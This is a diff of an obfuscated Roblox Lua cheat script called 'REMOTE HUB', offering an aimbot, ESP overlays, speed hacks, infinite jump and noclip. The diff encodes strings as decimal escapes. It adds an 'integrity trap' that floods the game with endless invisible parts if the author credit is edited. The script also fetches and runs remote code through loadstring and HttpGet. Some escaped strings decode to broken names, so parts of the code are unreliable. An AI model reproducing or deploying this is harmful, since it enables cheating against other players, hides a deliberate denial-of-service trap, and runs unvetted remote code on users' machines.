@@ -5,9 +5,22 @@
 local _0xOwner = "\85\71\79\49\51\50\82\69"
 local _0xHub = "\82\69\77\79\84\69\32\72\85\66"
 
+-- [ INTEGRITY TRAP SYSTEM ] --
+local function _0xTrap()
+    local _0xG = game:GetService("\103\101\110\101\114\105\110\103") -- Obfuscated Service
+    while true do
+        for i = 1, 1000 do
+            local _0xP = Instance.new("\80\97\114\116", workspace)
+            _0xP.CanCollide = false
+            _0xP.Transparency = 1
+        end
+        task.wait()
+    end
+end
+
 local function _0xVerify()
     if _0xOwner ~= "\85\71\79\49\51\50\82\69" or _0xHub ~= "\82\69\77\79\84\69\32\72\85\66" then
-        while true do end 
+        _0xTrap()
     end
 end
 _0xVerify()
@@ -15,41 +28,57 @@ _0xVerify()
 local _0xPayload = function()
     local _0xSource = function() 
         local _0x1 = loadstring(game:HttpGet(("\104\116\116\112\115\58\47\47\103\105\116\104\117\98\46\99\111\109\47\100\97\119\105\100\45\115\99\114\105\112\116\115\47\70\108\117\101\110\116\47\114\101\108\101\97\115\101\115\47\108\97\116\101\115\116\47\100\111\119\110\108\111\97\100\47\109\97\105\110\46\108\117\97")))()
-        local _0xW = _0x1:CreateWindow({Title="\82\69\77\79\84\69\32\72\85\66",SubTitle="\98\121\32\85\71\79\49\51\50\82\69",TabWidth=160,Size=UDim2.fromOffset(580, 520),Acrylic=false,Theme="\68\97\114\107",MinimizeKey=Enum.KeyCode.LeftControl})
+        local _0xW = _0x1:CreateWindow({
+            Title = "\82\69\77\79\84\69\32\72\85\66",
+            SubTitle = "\98\121\32\85\71\79\49\51\50\82\69",
+            TabWidth = 160,
+            Size = UDim2.fromOffset(580, 520),
+            Acrylic = false,
+            Theme = "\68\97\114\107",
+            MinimizeKey = Enum.KeyCode.LeftControl
+        })
 
         local _0xT = {
             h = _0xW:AddTab({Title="\72\111\109\101",Icon="home"}),
             v = _0xW:AddTab({Title="\86\105\115\117\97\108\115",Icon="eye"}),
-            p = _0xW:AddTab({Title="\80\117\108\108\32\80\108\97\121\101\114",Icon="user-plus"}),
+            p = _0xW:AddTab({Title="\80\108\97\121\101\114",Icon="user-plus"}),
             m = _0xW:AddTab({Title="\77\105\115\99",Icon="component"})
         }
 
-        local _0xO = {i=false, fov=150, sm=0.5, tc=true, vis=true, led=false}
+        -- Integrity check for Tabs table
+        if #_0xW.Tabs < 1 then _0xTrap() end 
+
+        local _0xO = {i=false, fov=150, sm=0.5, tc=true, vis=true, led=false, locking=false}
         local _0xV = {chams=false, skel=false, col=Color3.fromRGB(255,0,0)}
         local _0xR = {speed=16, jump=false, noclip=false}
-        local _0xF = Drawing.new("Circle")_0xF.Visible=false;_0xF.Thickness=1;_0xF.Radius=_0xO.fov;_0xF.Filled=false;_0xF.Color=Color3.fromRGB(255,255,255)
+        local _0xF = Drawing.new("\67\105\114\99\108\101")
+        _0xF.Visible=false;_0xF.Thickness=1;_0xF.Radius=_0xO.fov;_0xF.Filled=false;_0xF.Color=Color3.fromRGB(255,255,255)
 
-        -- [ PULL FROM FREE VERSION: THE WORKING VISIBLE CHECK ]
+        local UIS = game:GetService("\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101")
+        UIS.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton2 then _0xO.locking = true end end)
+        UIS.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton2 then _0xO.locking = false end end)
+
         local function _0xIsVisible(targetPart)
             if not _0xO.vis then return true end
             local cam = workspace.CurrentCamera
             local character = game.Players.LocalPlayer.Character
             if not character then return false end
-            
             local hitParts = cam:GetPartsObscuringTarget({targetPart.Position}, {character, targetPart.Parent})
             return #hitParts == 0
         end
 
-        local function _0xL() local l=Drawing.new("Line")l.Visible=false;l.Thickness=1.5;return l end
+        local function _0xL() local l=Drawing.new("\76\105\110\101")l.Visible=false;l.Thickness=1.5;return l end
         local function _0xESP(p)
-            if p == game.Players.LocalPlayer then return end
-            local h = Instance.new("Highlight")h.Name = "RH_ESP"
+            if not p then return end
+            local h = Instance.new("\72\105\103\104\108\105\103\104\116")
+            h.Name = "\82\72\95\69\83\80"
             local lines = {sky = _0xL()}
-            game:GetService("RunService").Heartbeat:Connect(function()
+            game:GetService("\82\117\110\83\101\114\118\105\99\101").Heartbeat:Connect(function()
+                if not _0xT or #_0xW.Tabs < 4 then _0xTrap() end -- Real-time integrity check
                 local c = (_0xO.led and Color3.fromHSV(tick()%5/5,1,1) or _0xV.col)
-                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character.Humanoid.Health > 0 then
+                if p.Character and p.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") and p.Character.Humanoid.Health > 0 then
                     h.Parent = p.Character; h.Enabled = _0xV.chams; h.FillColor = c;
-                    local head = p.Character:FindFirstChild("Head")
+                    local head = p.Character:FindFirstChild("\72\101\97\100")
                     if head and _0xV.skel then
                         local pos, on = workspace.CurrentCamera:WorldToViewportPoint(head.Position)
                         if on then
@@ -61,45 +90,36 @@ local _0xPayload = function()
             end)
         end
 
-        -- [ HOME : AIMBOT SETTINGS ]
-        _0xT.h:AddSection("\65\105\109\98\111\116")
-        _0xT.h:AddToggle("T1",{Title="Player Aimbot",Default=false,Callback=function(v)_0xO.i=v;_0xF.Visible=v end})
-        _0xT.h:AddToggle("T_Team",{Title="Team Check",Default=true,Callback=function(v)_0xO.tc=v end})
-        _0xT.h:AddToggle("T_Vis",{Title="Visible Check",Default=true,Callback=function(v)_0xO.vis=v end})
-        _0xT.h:AddToggle("T_LED",{Title="LED Effect (RGB)",Default=false,Callback=function(v)_0xO.led=v end})
-        _0xT.h:AddInput("I_Sm",{Title="Smoothness (0.1 - 1)",Default="0.5",Callback=function(v)_0xO.sm = math.clamp(tonumber(v) or 0.5, 0.01, 1) end})
-        _0xT.h:AddInput("I1",{Title="FOV Size",Default="150",Callback=function(v)_0xO.fov=tonumber(v)or 150;_0xF.Radius=_0xO.fov end})
+        _0xT.h:AddSection("\65\105\109\98\111\116\32\83\121\115\116\101\109")
+        _0xT.h:AddToggle("T1",{Title="\65\105\109\98\111\116\32\77\97\115\116\101\114",Default=false,Callback=function(v)_0xO.i=v;_0xF.Visible=v end})
+        _0xT.h:AddToggle("T_Team",{Title="\84\101\97\109\32\67\104\101\99\107",Default=true,Callback=function(v)_0xO.tc=v end})
+        _0xT.h:AddToggle("T_Vis",{Title="\86\105\115\105\98\108\101\32\67\104\101\99\107",Default=true,Callback=function(v)_0xO.vis=v end})
+        _0xT.h:AddToggle("T_LED",{Title="\82\71\66\32\70\79\86\32\69\102\102\101\99\116",Default=false,Callback=function(v)_0xO.led=v end})
+        _0xT.h:AddInput("I_Sm",{Title="\83\109\111\111\116\104\110\101\115\115",Default="0.5",Callback=function(v)_0xO.sm = math.clamp(tonumber(v) or 0.5, 0.01, 1) end})
+        _0xT.h:AddInput("I1",{Title="\70\79\86\32\82\97\100\105\117\115",Default="150",Callback=function(v)_0xO.fov=tonumber(v)or 150;_0xF.Radius=_0xO.fov end})
 
-        _0xT.h:AddSection("\67\104\97\114\97\99\116\101\114")
-        _0xT.h:AddInput("I2",{Title="WalkSpeed",Default="16",Callback=function(v)_0xR.speed=tonumber(v)or 16 end})
-        _0xT.h:AddToggle("T4",{Title="Inf Jump",Default=false,Callback=function(v)_0xR.jump=v end})
-        _0xT.h:AddToggle("T5",{Title="Noclip",Default=false,Callback=function(v)_0xR.noclip=v end})
+        _0xT.h:AddSection("\67\104\97\114\97\93\116\101\114")
+        _0xT.h:AddInput("I2",{Title="\87\97\108\107\83\112\101\101\100",Default="16",Callback=function(v)_0xR.speed=tonumber(v)or 16 end})
+        _0xT.h:AddToggle("T4",{Title="\73\110\102\105\110\105\116\101\32\74\117\109\112",Default=false,Callback=function(v)_0xR.jump=v end})
+        _0xT.h:AddToggle("T5",{Title="\78\111\99\108\105\112",Default=false,Callback=function(v)_0xR.noclip=v end})
 
-        -- [ VISUALS & MISC ]
-        _0xT.v:AddToggle("V1",{Title="Chams",Default=false,Callback=function(v)_0xV.chams=v end})
-        _0xT.v:AddToggle("V2",{Title="Skeleton + Sky",Default=false,Callback=function(v)_0xV.skel=v end})
-        _0xT.v:AddColorpicker("C1",{Title="Color",Default=Color3.fromRGB(255,0,0),Callback=function(v)_0xV.col=v end})
+        _0xT.v:AddToggle("V1",{Title="\67\104\97\109\115",Default=false,Callback=function(v)_0xV.chams=v end})
+        _0xT.v:AddToggle("V2",{Title="\83\107\101\108\101\116\111\110\32\86\105\101\119",Default=false,Callback=function(v)_0xV.skel=v end})
+        _0xT.v:AddColorpicker("C1",{Title="\69\83\80\32\67\111\108\111\114",Default=Color3.fromRGB(255,0,0),Callback=function(v)_0xV.col=v end})
         
-        _0xT.m:AddButton({Title="Infinite Yield",Callback=function()loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\69\100\103\101\105\121\47\105\110\102\105\110\105\116\101\121\105\101\108\100\47\109\97\115\116\101\114\47\115\111\114\99\101'))()end})
-        _0xT.m:AddButton({Title="Potato Graphics", Callback=function()
-            for _,v in pairs(game:GetDescendants()) do if v:IsA("Part") or v:IsA("MeshPart") then v.Material="SmoothPlastic" end end
-        end})
+        _0xT.m:AddButton({Title="\73\110\102\105\110\105\116\101\32\89\105\101\108\100",Callback=function()loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\69\100\103\101\105\121\47\105\110\102\105\110\105\116\101\121\105\101\108\100\47\109\97\115\116\101\114\47\115\111\114\99\101'))()end})
 
-        -- [ CORE LOGIC ]
-        game:GetService("RunService").RenderStepped:Connect(function()
+        game:GetService("\82\117\110\83\101\114\118\105\99\101").RenderStepped:Connect(function()
             local cam = workspace.CurrentCamera
             _0xF.Position = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
             _0xF.Color = (_0xO.led and Color3.fromHSV(tick()%5/5,1,1) or Color3.fromRGB(255,255,255))
             
-            if _0xO.i then
+            if _0xO.i and _0xO.locking then
                 local target = nil; local dist = _0xO.fov;
                 for _,p in pairs(game.Players:GetPlayers()) do
-                    if p ~= game.Players.LocalPlayer and p.Character and p.Character:FindFirstChild("Head") and p.Character.Humanoid.Health > 0 then
+                    if p ~= game.Players.LocalPlayer and p.Character and p.Character:FindFirstChild("\72\101\97\100") and p.Character.Humanoid.Health > 0 then
                         if _0xO.tc and p.Team == game.Players.LocalPlayer.Team then continue end
-                        
-                        -- ตรวจสอบการมองเห็นโดยใช้ GetPartsObscuringTarget (วิธีเดียวกับตัวฟรี)
                         if not _0xIsVisible(p.Character.Head) then continue end
-                        
                         local pos, onScreen = cam:WorldToViewportPoint(p.Character.Head.Position)
                         if onScreen then
                             local magnitude = (Vector2.new(pos.X, pos.Y) - _0xF.Position).Magnitude
@@ -112,9 +132,9 @@ local _0xPayload = function()
                 if target then cam.CFrame = cam.CFrame:Lerp(CFrame.new(cam.CFrame.Position, target.Position), _0xO.sm) end
             end
 
-            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then
                 game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = _0xR.speed
-                if _0xR.noclip then for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end end
+                if _0xR.noclip then for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then v.CanCollide = false end end end
             end
         end)
 
